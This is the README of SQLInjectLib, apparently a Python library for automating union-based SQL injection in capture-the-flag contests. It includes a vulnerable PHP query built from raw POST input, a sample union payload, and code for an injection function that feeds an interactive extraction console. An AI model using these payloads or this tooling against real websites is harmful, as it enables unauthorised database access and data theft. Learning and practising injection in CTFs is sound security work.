# SQLInjectLib

## Introduction

> A library to simplify SQL injections during CTFs

## Tutorial

> First of all you need to find out the type of injection you need
>
> ### Union Injection
>
> You need an injection function
>
> An injection function is function that takes an SQL expression as input and returns a string
>
> #### Example
>
> We need to print all the username in a table of users in a website that is vulnerable to a simple union injection
>
> The website does something like this in the backend
>
> ```php
> $cursor=query("SELECT name,price FROM cars WHERE name like '%".$_POST["search"]."%')
> foreach($cursor as $elem)
>   echo $elem[0].",".$elem[1]
> ```
>
> The website gives us the result 'lol' if we send a string in the search like "42' union select 'lol',4"
>
> Now we need to build our injection function, the library will use our injection function later to extract informations from the database
>
> To do so, we need to:
>
> 1. create a string that will be sent to the server
> 2. send the string to the server
> 3. parse the response to return the result
>
> ```python
> def injection(expr):
>     query=f'42" union select {expr},4'
>     response=post(URL,query)
>     return response.split(',')[0]
> ```
>
> in this case our query string is like the example before but with 'lol' replace with a generic expression
>
> post can be anything that sends our query to the server and returns its response
>
> We need to return the result of our query, in our case response without the second value (4)
>
> Now we need to build our SQLInjector object, in this case we use an UnionInjector object
>
> ```python
> inject = UnionInjector(union_injection, database_type=MySQL())
> ```
>
> This object contains all the code we need to have a nice console to use to perform our injection
> You need to know the database type, in our example we use MySQL
>
> Now to use the object and have our console we use its main method
>
> ```python
> inject.main()
> ```
>
> When you run the program an interactive session will be presented
>
> In this console you can execute every SQL query you want plus some special commands
>
> With help you can list these special commands
>
> _Warning_: if you select a column or a table that does not exist, you could get a python exception and the program may crash

## Installation

> Install locally with:
>
> ```bash
> python3 -m pip install sqlinjectlib
> ```
